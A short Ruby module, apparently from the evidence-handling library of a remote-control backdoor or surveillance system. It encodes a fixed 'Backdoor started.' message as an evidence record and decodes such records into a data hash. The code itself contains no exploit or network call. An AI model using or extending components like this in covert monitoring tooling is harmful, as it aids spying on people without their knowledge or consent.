
require 'rcs-common/evidence/common'

module RCS

module InfoEvidence
  def content
    "(ruby) Backdoor started.".to_utf16le_binary
  end
  
  def generate_content
    [ content ]
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] = Hash.new if info[:data].nil?
    info[:data][:content] = chunks.first.utf16le_to_utf8
    yield info if block_given?
    :delete_raw
  end
end

end # RCS::